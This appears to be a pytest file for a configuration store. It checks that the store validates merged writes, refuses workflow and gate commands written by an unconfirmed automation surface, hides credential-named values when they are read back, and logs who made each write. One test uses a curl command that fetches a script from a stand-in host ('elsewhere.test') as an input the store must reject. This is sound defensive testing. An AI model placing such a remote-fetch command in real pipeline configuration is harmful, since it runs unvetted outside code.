"""The single validated write path.

What these tests hold: every surface writes through one door, that door
validates the merged result before anything lands on disk, a failed write leaves
the previous document intact, the config-only objects — the autonomy policy, the
delivery workflow, capability bindings — cannot be written by a surface no human
confirmed, every accepted write leaves a durable record of who made it, and a
value the store classifies as a credential is elided on the way back out.
"""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from kiro_crew import platform_compat
from kiro_crew.apps.builtins.spec_engine.engine.config import (
    APP_NAME,
    CONFIG_FILENAME,
    CURRENT_VERSION,
    DASHBOARD_SURFACE,
    ELIDED,
    SETUP_ASSISTANT_SURFACE,
    WRITE_LOG_FILENAME,
    ConfigLoadError,
    ConfigRecordError,
    ConfigStore,
    ConfigValidationError,
    ConfigWriteRefused,
    ConfigWriteSurface,
    ValueOrigin,
    config_only_paths,
    default_root,
    elide_secrets,
    is_secret_key,
    key_segments,
)

#: A surface with no human watching. Stands in for any future non-interactive
#: writer; the config-only guard must refuse it.
UNCONFIRMED_SURFACE = ConfigWriteSurface("automation")


@pytest.fixture()
def store(tmp_path: Path) -> ConfigStore:
    return ConfigStore(tmp_path / "state")


class TestWritePath:
    def test_write_persists_and_is_readable_as_an_effective_value(self, store: ConfigStore):
        store.write({"limits": {"task_retry_limit": 6}}, surface=DASHBOARD_SURFACE)
        effective = store.effective("limits.task_retry_limit")
        assert effective.value == 6
        assert effective.origin is ValueOrigin.APP_CONFIG
        assert store.path.name == CONFIG_FILENAME
        assert json.loads(store.path.read_text(encoding="utf-8"))["limits"]["task_retry_limit"] == 6

    def test_write_stamps_the_schema_version(self, store: ConfigStore):
        saved = store.write({"limits": {"task_retry_limit": 1}}, surface=DASHBOARD_SURFACE)
        assert saved["version"] == CURRENT_VERSION

    def test_writes_merge_rather_than_replace(self, store: ConfigStore):
        store.write(
            {"projects": {"acme": {"path": "/w/acme", "base_branch": "main"}}},
            surface=DASHBOARD_SURFACE,
        )
        store.write(
            {"projects": {"widgets": {"path": "/w/widgets"}}},
            surface=SETUP_ASSISTANT_SURFACE,
        )
        saved = store.document()
        assert set(saved["projects"]) == {"acme", "widgets"}
        assert saved["projects"]["acme"]["base_branch"] == "main"

    def test_a_null_value_removes_a_setting_and_restores_its_default(self, store: ConfigStore):
        store.write({"limits": {"task_retry_limit": 6}}, surface=DASHBOARD_SURFACE)
        store.write({"limits": {"task_retry_limit": None}}, surface=DASHBOARD_SURFACE)
        effective = store.effective("limits.task_retry_limit")
        assert effective.is_default
        assert "task_retry_limit" not in store.document().get("limits", {})

    def test_an_invalid_patch_is_refused_and_leaves_the_document_untouched(
        self, store: ConfigStore
    ):
        store.write({"limits": {"task_retry_limit": 6}}, surface=DASHBOARD_SURFACE)
        before = store.path.read_text(encoding="utf-8")
        with pytest.raises(ConfigValidationError) as caught:
            store.write({"limits": {"task_retry_limit": -3}}, surface=DASHBOARD_SURFACE)
        assert [e.path for e in caught.value.errors] == ["limits.task_retry_limit"]
        assert store.path.read_text(encoding="utf-8") == before

    def test_a_patch_valid_alone_but_invalid_when_merged_is_refused(self, store: ConfigStore):
        # The project entry is only complete once merged, so validation has to
        # run on the merged result rather than on the patch.
        with pytest.raises(ConfigValidationError):
            store.write({"projects": {"acme": {"base_branch": "main"}}}, surface=DASHBOARD_SURFACE)
        store.write({"projects": {"acme": {"path": "/w/acme"}}}, surface=DASHBOARD_SURFACE)
        store.write({"projects": {"acme": {"base_branch": "main"}}}, surface=DASHBOARD_SURFACE)
        assert store.document()["projects"]["acme"]["base_branch"] == "main"

    def test_a_non_object_patch_is_refused(self, store: ConfigStore):
        with pytest.raises(ConfigValidationError):
            store.write(["limits"], surface=DASHBOARD_SURFACE)  # type: ignore[arg-type]

    def test_the_document_is_owner_only(self, store: ConfigStore):
        if platform_compat.IS_WINDOWS:
            pytest.skip("no POSIX mode bits on Windows")
        store.write({"limits": {"task_retry_limit": 2}}, surface=DASHBOARD_SURFACE)
        assert store.path.stat().st_mode & 0o777 == 0o600

    def test_a_corrupt_document_fails_loudly(self, store: ConfigStore):
        store.root.mkdir(parents=True, exist_ok=True)
        store.path.write_text("{not json", encoding="utf-8")
        with pytest.raises(ConfigLoadError):
            store.document()

    def test_a_json_scalar_document_is_refused(self, store: ConfigStore):
        store.root.mkdir(parents=True, exist_ok=True)
        store.path.write_text("42", encoding="utf-8")
        with pytest.raises(ConfigLoadError):
            store.document()

    def test_validate_reports_problems_instead_of_raising(self, store: ConfigStore):
        store.root.mkdir(parents=True, exist_ok=True)
        store.path.write_text(json.dumps({"limits": {"nope": 1}}), encoding="utf-8")
        assert [e.path for e in store.validate()] == ["limits.nope"]


class TestConfigOnlyObjects:
    def test_config_only_paths_names_the_restricted_objects(self):
        patch = {
            "sources": {"s": {"enabled": True}},
            "workflow": {"stages": {}},
            "capabilities": {"analysis": {"transport": "builtin"}},
            "projects": {"acme": {"workflow": {"stages": {}}}, "widgets": {"path": "/w"}},
            "limits": {"task_retry_limit": 1},
        }
        assert config_only_paths(patch) == (
            "capabilities",
            "projects.acme.workflow",
            "sources",
            "workflow",
        )

    def test_ordinary_settings_are_not_restricted(self):
        assert config_only_paths({"limits": {"task_retry_limit": 1}}) == ()

    def test_the_integration_switch_is_restricted_at_both_scopes(self):
        # It is one setting rather than a whole section, but it co-gates
        # unattended integration alongside the autonomy ladder, and integration
        # is the stage a mistake cannot undo. A ladder no tool can widen buys
        # little if the other gate on the same action stays freely writable.
        assert config_only_paths({"delivery": {"auto_integrate": True}}) == (
            "delivery.auto_integrate",
        )
        assert config_only_paths(
            {"projects": {"acme": {"delivery": {"auto_integrate": True}}}}
        ) == ("projects.acme.delivery.auto_integrate",)

    def test_other_delivery_settings_stay_ordinary(self):
        # Only the integration switch is fenced; fencing the whole section would
        # make routine delivery settings need an operator-confirmed surface.
        assert config_only_paths({"delivery": {"base_branch": "main"}}) == ()

    @pytest.mark.parametrize(
        "patch",
        [
            {"delivery": {"auto_integrate": True}},
            {"projects": {"acme": {"path": "/w", "delivery": {"auto_integrate": True}}}},
        ],
    )
    def test_an_unconfirmed_surface_cannot_arm_unattended_integration(
        self, store: ConfigStore, patch: dict
    ):
        with pytest.raises(ConfigWriteRefused):
            store.write(patch, surface=UNCONFIRMED_SURFACE)
        assert not store.path.exists()

    @pytest.mark.parametrize(
        "patch",
        [
            {"sources": {"s": {"poll": ["gh"], "autonomy": {"external": {"default": "delivery"}}}}},
            {"workflow": {"stages": {"publish": [["gh", "pr", "merge"]]}}},
            {"capabilities": {"review": {"transport": "command", "command": ["x"]}}},
            {"projects": {"acme": {"path": "/w", "workflow": {"stages": {"verify": [["x"]]}}}}},
            # A gate command is argv the pipeline runs, so refusing it at the
            # workflow stage and accepting it here would be a way through the
            # fence rather than a gap beside it.
            {"quality_gates": {"tests": {"commands": [["curl", "http://elsewhere.test/x.sh"]]}}},
        ],
    )
    def test_an_unconfirmed_surface_cannot_write_a_config_only_object(
        self, store: ConfigStore, patch: dict
    ):
        with pytest.raises(ConfigWriteRefused) as caught:
            store.write(patch, surface=UNCONFIRMED_SURFACE)
        assert caught.value.surface is UNCONFIRMED_SURFACE
        assert caught.value.paths
        assert not store.path.exists()

    def test_an_unconfirmed_surface_may_still_write_ordinary_settings(self, store: ConfigStore):
        store.write({"limits": {"task_retry_limit": 1}}, surface=UNCONFIRMED_SURFACE)
        assert store.effective("limits.task_retry_limit").value == 1

    def test_operator_confirmed_surfaces_may_write_config_only_objects(self, store: ConfigStore):
        for surface in (DASHBOARD_SURFACE, SETUP_ASSISTANT_SURFACE):
            assert surface.operator_confirmed
        store.write(
            {"workflow": {"stages": {"verify": [["make", "test"]]}}},
            surface=SETUP_ASSISTANT_SURFACE,
        )
        assert store.document()["workflow"]["stages"]["verify"] == [["make", "test"]]


class TestSecretClassification:
    """Which values a read path must not hand out, and which it must keep.

    Both directions matter equally. A classification that misses a token leaks it
    into a model's context; a classification that elides ``token_bucket_size``
    teaches every caller that the marker means nothing.
    """

    @pytest.mark.parametrize(
        "key",
        [
            "token",
            "api_key",
            "API_KEY",
            "GITHUB_TOKEN",
            "apiToken",
            "client-secret",
            "password",
            "passwd",
            "passphrase",
            "credentials",
            "aws_secret_access_key",
        ],
    )
    def test_a_key_naming_a_credential_is_classified_secret(self, key: str):
        assert is_secret_key(key)

    @pytest.mark.parametrize(
        "key",
        [
            # The lookalikes. Each mentions a credential noun and holds none: the
            # last segment is what the value IS, and here it is a size, an order,
            # a count, a path or a flag.
            "token_bucket_size",
            "secret_scanning_enabled",
            "key_order",
            "password_policy_url",
            "credentials_path",
            "tokens_per_minute",
            "limits",
            "base_branch",
            "transport",
        ],
    )
    def test_a_key_merely_mentioning_a_credential_is_not(self, key: str):
        assert not is_secret_key(key)

    def test_segments_split_on_punctuation_and_case(self):
        assert key_segments("GITHUB_TOKEN") == ("github", "token")
        assert key_segments("apiToken") == ("api", "token")
        assert key_segments("client-secret.v2") == ("client", "secret", "v2")

    def test_elision_replaces_the_value_and_reports_the_path(self):
        elided = elide_secrets(
            {
                "capabilities": {"analysis": {"env": {"GITHUB_TOKEN": "ghp_sentinel"}}},
                "projects": {"acme": {"variables": {"api_key": "AKIA_sentinel"}}},
                "limits": {"task_retry_limit": 4},
            }
        )
        assert elided.document["capabilities"]["analysis"]["env"]["GITHUB_TOKEN"] == ELIDED
        assert elided.document["projects"]["acme"]["variables"]["api_key"] == ELIDED
        assert elided.document["limits"]["task_retry_limit"] == 4
        assert elided.paths == (
            "capabilities.analysis.env.GITHUB_TOKEN",
            "projects.acme.variables.api_key",
        )

    def test_a_secret_container_is_elided_whole(self):
        # Descending into it would publish the field names of the thing being
        # withheld, which is itself half the credential.
        elided = elide_secrets({"credentials": {"username": "ada", "password": "hunter2"}})
        assert elided.document == {"credentials": ELIDED}
        assert "ada" not in json.dumps(elided.document)

    def test_lists_are_walked(self):
        # Quality gates are a list of objects, so a secret can sit at an index
        # rather than under a key.
        elided = elide_secrets({"gates": [{"name": "lint"}, {"token": "sentinel"}]})
        assert elided.document["gates"][1]["token"] == ELIDED
        assert elided.paths == ("gates[1].token",)

    def test_the_persisted_document_still_holds_the_value(self, store: ConfigStore):
        # Elision is a read-path concern. A write that dropped the value would
        # break the capability that needs it on the next run.
        store.write(
            {"projects": {"acme": {"path": "/w/acme", "variables": {"api_key": "sentinel"}}}},
            surface=DASHBOARD_SURFACE,
        )
        assert store.document()["projects"]["acme"]["variables"]["api_key"] == "sentinel"
        assert elide_secrets(store.document()).paths == ("projects.acme.variables.api_key",)


#: Leaf values a generated document carries. A string that looks like a
#: credential and a number, so a leak shows up as the sentinel itself.
_LEAVES = st.one_of(st.just("SENTINEL-CREDENTIAL"), st.integers(min_value=0, max_value=99))

#: Keys drawn from both sides of the classification, so a generated document
#: mixes secrets with lookalikes rather than testing one branch.
_KEYS = st.sampled_from(
    [
        "api_key",
        "GITHUB_TOKEN",
        "password",
        "credentials",
        "token_bucket_size",
        "limits",
        "task_retry_limit",
        "transport",
    ]
)


class TestSecretClassificationProperties:
    """The elision rule over generated documents, not only the shapes chosen above.

    Two halves of one property, because either alone is satisfiable by a useless
    implementation: eliding everything satisfies the first, eliding nothing
    satisfies the second.
    """

    @settings(max_examples=200, deadline=None)
    @given(
        document=st.dictionaries(
            _KEYS,
            st.recursive(
                _LEAVES,
                lambda children: st.one_of(
                    st.dictionaries(_KEYS, children, max_size=3),
                    st.lists(children, max_size=3),
                ),
                max_leaves=6,
            ),
            max_size=4,
        )
    )
    def test_a_secret_branch_collapses_to_the_marker_and_nothing_else_moves(self, document: dict):
        elided = elide_secrets(document)

        # The characterization, as a path-to-value map so it says both halves at
        # once: every leaf NOT under a secret-classified key survives at its own
        # path with its own value, every secret-classified key holds exactly the
        # marker, and no leaf appears anywhere it was not. Comparing values as sets
        # instead would be defeated by a document that legitimately repeats one
        # string under a visible key.
        expected = {
            path: value for path, value in _leaves(document).items() if not _under_secret(path)
        }
        expected.update({path: ELIDED for path in _secret_paths(document)})
        assert _leaves(elided.document) == expected

        # And the reported paths are exactly the elided ones, so a surface can
        # tell an operator what was withheld.
        assert set(elided.paths) == _secret_paths(document)


def _leaves(node: object, prefix: str = "") -> dict[str, object]:
    """Every leaf in a document, keyed by its dotted path."""
    found: dict[str, object] = {}
    if isinstance(node, dict):
        for key, value in node.items():
            name = str(key)
            found.update(_leaves(value, f"{prefix}.{name}" if prefix else name))
    elif isinstance(node, list):
        for index, item in enumerate(node):
            found.update(_leaves(item, f"{prefix}[{index}]"))
    elif prefix:
        found[prefix] = node
    return found


def _under_secret(path: str) -> bool:
    """Whether any key segment of *path* is itself classified secret."""
    return any(is_secret_key(part.split("[", 1)[0]) for part in path.split(".") if part)


def _secret_paths(node: object, prefix: str = "") -> set[str]:
    """The dotted path of every secret-classified key, outermost only."""
    found: set[str] = set()
    if isinstance(node, dict):
        for key, value in node.items():
            name = str(key)
            path = f"{prefix}.{name}" if prefix else name
            if is_secret_key(name):
                found.add(path)
            else:
                found |= _secret_paths(value, path)
    elif isinstance(node, list):
        for index, item in enumerate(node):
            found |= _secret_paths(item, f"{prefix}[{index}]")
    return found


class TestWriteRecord:
    """Who wrote configuration, recorded somewhere that outlives the process.

    The engine demands a named human before it applies a setup plan. Before this
    record existed, that name was echoed in a reply and kept nowhere, so the one
    question an incident asks — who authorized the autonomy this host is running
    at — had no answer on disk.
    """

    def test_a_write_records_the_surface_and_the_actor(self, store: ConfigStore):
        store.write(
            {"limits": {"task_retry_limit": 2}}, surface=DASHBOARD_SURFACE, actor=" ada@example "
        )
        records = store.writes()
        assert len(records) == 1
        assert records[0]["surface"] == DASHBOARD_SURFACE.name
        assert records[0]["operator_confirmed"] is True
        assert records[0]["actor"] == "ada@example"
        assert records[0]["keys"] == ["limits"]
        assert records[0]["ts"]

    def test_the_record_survives_the_store_object(self, store: ConfigStore):
        # The point of the record is that it outlives the process that wrote it,
        # so it is read back through a store built from nothing but the root.
        store.write({"limits": {"task_retry_limit": 2}}, surface=DASHBOARD_SURFACE, actor="ada")
        store.write({"limits": {"verify_retry_limit": 1}}, surface=DASHBOARD_SURFACE, actor="bo")
        reopened = ConfigStore(store.root)
        assert [record["actor"] for record in reopened.writes()] == ["ada", "bo"]
        assert reopened.write_log_path.name == WRITE_LOG_FILENAME

    def test_a_surface_with_no_identity_records_that_rather_than_inventing_one(
        self, store: ConfigStore
    ):
        store.write({"limits": {"task_retry_limit": 2}}, surface=UNCONFIRMED_SURFACE)
        assert store.writes()[0]["actor"] is None
        assert store.writes()[0]["operator_confirmed"] is False

    def test_a_confirmed_write_records_which_fenced_paths_it_exercised(self, store: ConfigStore):
        store.write(
            {"workflow": {"stages": {"verify": [["make", "test"]]}}},
            surface=SETUP_ASSISTANT_SURFACE,
            actor="ada",
        )
        assert store.writes()[0]["config_only_paths"] == ["workflow"]

    def test_the_record_carries_no_written_value(self, store: ConfigStore):
        # A record that copied the patch would be a second place credentials
        # live, and one no read path elides.
        store.write(
            {"projects": {"acme": {"path": "/w/acme", "variables": {"api_key": "sentinel"}}}},
            surface=DASHBOARD_SURFACE,
            actor="ada",
        )
        assert "sentinel" not in store.write_log_path.read_text(encoding="utf-8")

    def test_a_refused_write_records_nothing(self, store: ConfigStore):
        with pytest.raises(ConfigWriteRefused):
            store.write({"workflow": {"stages": {}}}, surface=UNCONFIRMED_SURFACE, actor="ada")
        with pytest.raises(ConfigValidationError):
            store.write({"limits": {"task_retry_limit": -1}}, surface=DASHBOARD_SURFACE)
        assert store.writes() == ()

    def test_a_record_that_cannot_land_fails_the_write_loudly(
        self, store: ConfigStore, monkeypatch: pytest.MonkeyPatch
    ):
        # Loud rather than logged: a document that changed with nothing saying who
        # changed it is exactly the state the record exists to prevent, so the
        # caller is told both facts instead of reading an ordinary success.
        def refuse(path: str, flags: int, mode: int = 0o777) -> int:
            if path.endswith(WRITE_LOG_FILENAME):
                raise OSError(13, "permission denied")
            return real_open(path, flags, mode)

        real_open = os.open
        monkeypatch.setattr(os, "open", refuse)
        with pytest.raises(ConfigRecordError) as caught:
            store.write({"limits": {"task_retry_limit": 2}}, surface=DASHBOARD_SURFACE, actor="a")
        monkeypatch.undo()
        assert str(store.path) in str(caught.value)
        assert store.document()["limits"]["task_retry_limit"] == 2

    def test_a_truncated_line_does_not_hide_the_rest(self, store: ConfigStore):
        store.write({"limits": {"task_retry_limit": 2}}, surface=DASHBOARD_SURFACE, actor="ada")
        with store.write_log_path.open("a", encoding="utf-8") as log:
            log.write('{"ts": "2026-0\n')
        store.write({"limits": {"verify_retry_limit": 1}}, surface=DASHBOARD_SURFACE, actor="bo")
        assert [record["actor"] for record in store.writes()] == ["ada", "bo"]


class TestStateLocation:
    def test_state_root_may_not_be_inside_a_spec_directory(self, tmp_path: Path):
        with pytest.raises(ValueError):
            ConfigStore(tmp_path / ".kiro" / "specs" / "my-feature")

    def test_state_lives_in_the_app_data_directory_not_a_spec_directory(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        # Engine state must be shareable across the IDE and CLI without
        # appearing inside the spec directories they both read.
        monkeypatch.setenv("KIROCREW_HOME", str(tmp_path / "crew"))
        root = default_root()
        assert root.parts[-3:] == ("apps", APP_NAME, "data")
        pairs = {root.parts[i : i + 2] for i in range(len(root.parts) - 1)}
        assert (".kiro", "specs") not in pairs
        assert ConfigStore().path == root / CONFIG_FILENAME
